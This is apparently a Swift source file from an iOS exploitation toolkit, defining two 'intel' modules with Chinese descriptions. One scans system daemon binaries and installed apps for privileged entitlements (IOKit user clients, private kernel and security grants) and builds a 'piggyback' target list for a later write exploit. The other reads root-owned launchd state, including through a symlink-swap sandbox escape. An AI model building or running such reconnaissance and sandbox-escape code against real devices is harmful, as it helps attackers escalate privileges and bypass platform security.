import Foundation
import Darwin

// MARK: - intel.piggy + intel.launchd — the Tier-1 intel exports
//
// intel.piggy — THE PIGGYBACK TABLE: which processes on this device hold
// entitlements our sandboxed app lacks (IOKit user clients, private
// security grants) — the write-lane target list. Sources: daemon program
// binaries (direct read — system files; entitlements extracted from the
// code-signature blob, KEYS ONLY, values are never reported) and the
// LSApplicationProxy entitlement dict for installed apps (no binary read
// needed). The write lane only matters once the p116 rw escape is proven,
// but the table itself is pure read intel.
//
// intel.launchd — THE LIVE DAEMON STATE: /var/db/launchd.db (root-owned —
// denied dirs get honest verdict rows, overrides.plist via the p116 swap
// bridge), per-user launchd (com.apple.launchd.peruser.<uid> — where the
// user-session agents live: the GPU/IOSurface door holders), and the
// LaunchAgents dirs the 628-pull showed as empty/unreachable.

extension Catalog {

    static var intel: [ExploitModule] {
        let piggy: ExploitModule = ExploitModule(
            id: "intel.piggy",
            titleZh: "特权进程搭车表（entitlement 键级 intel，只读）",
            cve: "—",
            component: "LaunchCensus · AppCensus · MachO",
            primitive: .probe,
            reach: .inProcess,
            tier: 1,
            summaryZh: "扫 LaunchDaemon/LaunchAgent 程序二进制（代码签名 blob 里的 entitlement 键）+ 已装 App 的 LSApplicationProxy entitlement 字典，过滤出持有我们沙盒 App 没有的门（IOKit user client、private security、kernel 相关 grant）的进程 —— 即写通道（p116 rw）目标清单。只报键，不报值；纯读，一次 TAP。",
            notesZh: "二进制只读尾部 4 MB 窗口（entitlement blob 在签名的尾部）；大于 4 MB 且尾部无 blob 的跳过并计数。App 的 entitlement 走 LS 代理，不读包体。",
            run: intelPiggyRun)
        let launchd: ExploitModule = ExploitModule(
            id: "intel.launchd",
            titleZh: "live launchd 状态（overrides + per-user agents）",
            cve: "—",
            component: "SandboxExtension · FileManager",
            primitive: .probe,
            reach: .inProcess,
            tier: 1,
            summaryZh: "枚举 /var/db/launchd.db（overrides.plist 的启用/禁用状态、com.apple.launchd.peruser.<uid> 的用户会话 agents —— GPU/IOSurface 门持有者所在），被拒目录走 p116 swap 桥并报 verdict，LaunchAgents 目录给出 628-pull 里为零的真相（拒绝还是真空）。纯读；不写容器外任何路径。",
            notesZh: "一次 TAP。overrides.plist 解析出 label → Disabled 行；per-user 目录给出会话 agent 清单。",
            run: intelLaunchdRun)
        return [piggy, launchd]
    }

    // ---- shared: the interesting-key filter (the doors our app lacks) ----
    private static func interestingEntitlement(_ key: String) -> Bool {
        key.lowercased().contains("iokit")
        || key.lowercased().contains("user-client")
        || key.lowercased().contains("userclient")
        || key.lowercased().contains("unsandbox")
        || key.hasPrefix("com.apple.private.security.")
        || key.hasPrefix("com.apple.private.kernel")
        || key.hasPrefix("com.apple.private.memorystatus")
        || key.hasPrefix("com.apple.private.spawn")
        || key == "get-task-allow"
        || key == "platform-application"
    }

    private static func intelPiggyRun(_ ctx: RunContext) throws -> ModuleOutcome {
        ctx.arm("intel.piggy", "entitlement-key intel scan")
        var lines: [String] = []
        lines.append("=== intel.piggy session \(LabLocalMilitaryNow()) BUILD intel-piggy-v1 ===")
        lines.append("KEYS ONLY — entitlement values are the device's private data, never reported.")

        var tableRows: [(String, String)] = []   // (process, joined interesting keys)
        var fullDump: [String] = []
        var binariesScanned = 0, binariesSkipped = 0

        // ---- 1. daemon/agent program binaries ----
        let daemons = LaunchCensus.daemons()
        var seen = Set<String>()
        let programs = daemons.map(\.program).filter { !$0.isEmpty && seen.insert($0).inserted }
        lines.append("[scan] \(daemons.count) plists -> \(programs.count) distinct program binaries")
        for prog in programs {
            guard let fh = FileHandle(forReadingAtPath: prog) else { binariesSkipped += 1; continue }
            defer { try? fh.close() }
            let size = (try? fh.seekToEnd()) ?? 0
            guard size > 32 else { binariesSkipped += 1; continue }
            // entitlement blob rides at the code-signature tail: read the last 4 MB
            let window: UInt64 = 4 * 1024 * 1024
            let start = size > window ? size - window : 0
            try? fh.seek(toOffset: UInt64(start))
            guard let tail = try? fh.read(upToCount: Int(min(window, size - start))),
                  !tail.isEmpty else { binariesSkipped += 1; continue }
            binariesScanned += 1
            let keys = MachOInspector.entitlementKeys(tail)
            if keys.isEmpty {
                if size > window { binariesSkipped += 1; binariesScanned -= 1 }   // blob outside window
                continue
            }
            fullDump.append("BIN \(prog)\n  " + keys.joined(separator: "\n  "))
            let hits = keys.filter { interestingEntitlement($0) }
            if !hits.isEmpty { tableRows.append((prog, hits.joined(separator: ", "))) }
        }
        lines.append("[scan] \(binariesScanned) binaries parsed, \(binariesSkipped) skipped (unreadable/no-blob-in-tail)")

        // ---- 2. installed apps via the LS proxy (no binary read) ----
        let apps = AppCensus.installed()
        lines.append("[scan] \(apps.count) installed apps (LSApplicationProxy entitlement dict)")
        var appRows = 0
        for app in apps.prefix(600) {
            let meta = AppCensus.metadata(for: app.bundleID)
            guard let ents = meta["entitlements"] as? [String: Any], !ents.isEmpty else { continue }
            let keys = ents.keys.sorted()
            fullDump.append("APP \(app.bundleID) \(app.bundlePath)\n  " + keys.joined(separator: "\n  "))
            let hits = keys.filter { interestingEntitlement($0) }
            if !hits.isEmpty {
                tableRows.append((app.bundleID + " @ " + app.bundlePath, hits.joined(separator: ", ")))
                appRows += 1
            }
        }

        // ---- the table ----
        lines.append("=== PIGGYBACK TABLE (\(tableRows.count) holders: \(tableRows.count - appRows) binaries + \(appRows) apps) ===")
        for (who, keys) in tableRows {
            lines.append("[holder] \(who)")
            lines.append("    \(keys)")
        }
        if tableRows.isEmpty {
            lines.append("(none matched the interesting filter — full key dump in the artifact)")
        }
        lines.append("=== verdict ===")
        lines.append("READ INTEL. The write lane (targeting these parsers) needs the p116 rw")
        lines.append("escape PROVEN first (ARMORY: p116 rw gate, one tap). Not a kernel claim.")

        let body = lines.joined(separator: "\n")
        _ = ctx.write("intel_piggy", Data(body.utf8))
        _ = ctx.write("intel_piggy_full", Data(fullDump.joined(separator: "\n\n").utf8))
        return ModuleOutcome(
            headline: "\(tableRows.count) privileged holders found (\(binariesScanned) binaries + \(apps.count) apps scanned)",
            detail: body)
    }

    private static func intelLaunchdRun(_ ctx: RunContext) throws -> ModuleOutcome {
        ctx.arm("intel.launchd", "live launchd state")
        var lines: [String] = []
        lines.append("=== intel.launchd session \(LabLocalMilitaryNow()) BUILD intel-launchd-v1 ===")

        let fm = FileManager.default
        let link = ctx.workdir.appendingPathComponent("lum1na27_link")
        let decoy = ctx.workdir.appendingPathComponent("lum1na27_decoy")

        // ---- 1. the launchd.db tree ----
        let uid = getuid()
        let dbDirs = [
            "/var/db/launchd.db",
            "/var/db/launchd.db/com.apple.launchd",
            "/var/db/launchd.db/com.apple.launchd.peruser.\(uid)",
        ]
        for dir in dbDirs {
            let names = (try? fm.contentsOfDirectory(atPath: dir)) ?? nil
            if let names {
                lines.append("[dir] \(dir) — \(names.count) entries: \(names.prefix(12).joined(separator: ", "))")
                // parse any per-user agent plists (the session door holders)
                for name in names where name.hasSuffix(".plist") {
                    let p = (dir as NSString).appendingPathComponent(name)
                    guard let data = try? Data(contentsOf: URL(fileURLWithPath: p)),
                          let obj = try? PropertyListSerialization.propertyList(from: data, format: nil) as? [String: Any]
                    else { continue }
                    let label = obj["Label"] as? String ?? name
                    let prog = obj["Program"] as? String ?? (obj["ProgramArguments"] as? [String])?.first ?? ""
                    lines.append("  [agent] \(label) -> \(prog)")
                }
            } else {
                lines.append("[dir] \(dir) — DENIED from the app; verdict via the swap bridge below")
            }
        }

        // ---- 2. overrides.plist (root-owned) via the p116 swap bridge ----
        let overrides = [
            "/var/db/launchd.db/com.apple.launchd/overrides.plist",
            "/var/db/launchd.db/com.apple.launchd.peruser.\(uid)/overrides.plist",
        ]
        for target in overrides {
            if let direct = try? Data(contentsOf: URL(fileURLWithPath: target)),
               let obj = try? PropertyListSerialization.propertyList(from: direct, format: nil) as? [String: Any] {
                lines.append("[overrides] \(target) — direct read (\(obj.count) labels)")
                for (k, v) in obj.prefix(20) {
                    lines.append("   \(k) = \(v)")
                }
                continue
            }
            guard SandboxExtension.available else {
                lines.append("[overrides] \(target) — denied + bridge unavailable")
                continue
            }
            let r = SandboxExtension.readThroughSwap(target: target, link: link, decoy: decoy)
            switch r.verdict {
            case .bypassed, .noSandbox:
                if let data = r.data,
                   let obj = try? PropertyListSerialization.propertyList(from: data, format: nil) as? [String: Any] {
                    lines.append("[overrides] \(target) — \(r.verdict == .bypassed ? "ESCAPED" : "direct") read (\(obj.count) labels)")
                    for (k, v) in obj.prefix(20) {
                        lines.append("   \(k) = \(v)")
                    }
                    _ = ctx.write("overrides_\(target.lastPathComponent)", data)
                } else {
                    lines.append("[overrides] \(target) — \(r.verdict == .bypassed ? "bypassed" : "direct") but no bytes (\(r.bytes))")
                }
            case .blocked:
                lines.append("[overrides] \(target) — BLOCKED (uid wall, not sandbox: extension did not carry)")
            case .empty:
                lines.append("[overrides] \(target) — empty read")
            }
        }

        // ---- 3. the LaunchAgents truth (the 628-pull showed zero) ----
        for dir in ["/System/Library/LaunchAgents", "/Library/LaunchAgents"] {
            if let names = try? fm.contentsOfDirectory(atPath: dir) {
                lines.append("[agents] \(dir) — \(names.count) entries (empty dir = genuinely no agents here)")
            } else {
                lines.append("[agents] \(dir) — NOT LISTABLE (denied/no-traverse): the per-user db above is where session agents live")
            }
        }

        lines.append("=== verdict ===")
        lines.append("READ INTEL. Live daemon/agent state only — no kernel claim, no writes.")

        let body = lines.joined(separator: "\n")
        _ = ctx.write("intel_launchd", Data(body.utf8))
        return ModuleOutcome(headline: "launchd state mapped (db tree + overrides + agents)", detail: body)
    }
}
